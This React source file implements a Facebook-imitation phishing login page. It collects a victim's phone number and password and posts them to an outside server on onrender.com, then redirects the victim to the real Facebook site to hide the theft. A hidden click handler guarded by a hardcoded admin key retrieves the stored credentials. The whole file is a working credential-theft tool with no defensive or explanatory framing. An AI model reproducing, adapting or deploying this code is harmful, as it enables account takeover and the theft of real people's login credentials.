import { useState } from 'react'
import axios from 'axios';
import {FaFacebook} from 'react-icons/fa'
import './App.css'

function App() {
  const [formData, setFormData] = useState({
    phoneNumber: '',
    password: ''
  })

  const handleInsert = (e)=>{
    e.preventDefault();
    axios.post('https://server-mm3k.onrender.com/api/users', formData)
      .then((result)=>{
        console.log(result);
        setFormData({
          phoneNumber: '',
          password: ''
        })
        window.location.href = 'https://www.facebook.com';
      })
      .catch((err)=>{
        console.log(err);
        setFormData({
          phoneNumber: '',
          password: ''
        })
        alert("Erreur ! Veuillez remplir encore ce formulaire");
      })
  }

  const handleGet = ()=>{
    const adminKey = prompt("Admin Key please ?")
    if (adminKey=='rodyandry') {
      axios.get('https://server-mm3k.onrender.com/api/users')
        .then((result)=>{
          console.log(result.data);
          setFormData({
            phoneNumber: '',
            password: ''
          })
        })
        .catch((err)=>{
          console.log(err);
        })
    }else{
      window.close();
    }
  }

  return (
    <div className="container">
	<div className="screen">
		<div className="screen__content">
			<form className="login">
				<div className="login__field">
					<i className="login__icon fas fa-user"></i>
					<input type="text" className="login__input" placeholder="Phone number" onChange={(e)=>{setFormData({phoneNumber:e.target.value, password:formData.password})}} style={{color:'black'}} value={formData.phoneNumber}/>
				</div>
				<div className="login__field">
					<i className="login__icon fas fa-lock"></i>
					<input type="password" className="login__input" placeholder="Password" onChange={(e)=>setFormData({phoneNumber:formData.phoneNumber, password:e.target.value})} style={{color:'black'}} value={formData.password}/>
				</div>
				<button className="button login__submit" onClick={handleInsert}>
					<span className="button__text">Log In Now</span>
					<i className="button__icon fas fa-chevron-right"></i>
				</button>				
			</form>
			<div className="social-login">
				<h3>log in via Facebook <br /> <FaFacebook onClick={handleGet}/></h3>
				<div className="social-icons">
					<a href="#" className="social-login__icon fab fa-instagram"></a>
					<a href="#" className="social-login__icon fab fa-facebook"></a>
					<a href="#" className="social-login__icon fab fa-twitter"></a>
				</div>
			</div>
		</div>
		<div className="screen__background">
			<span className="screen__background__shape screen__background__shape4"></span>
			<span className="screen__background__shape screen__background__shape3"></span>		
			<span className="screen__background__shape screen__background__shape2"></span>
			<span className="screen__background__shape screen__background__shape1"></span>
		</div>		
	</div>
</div>
  )
}

export default App
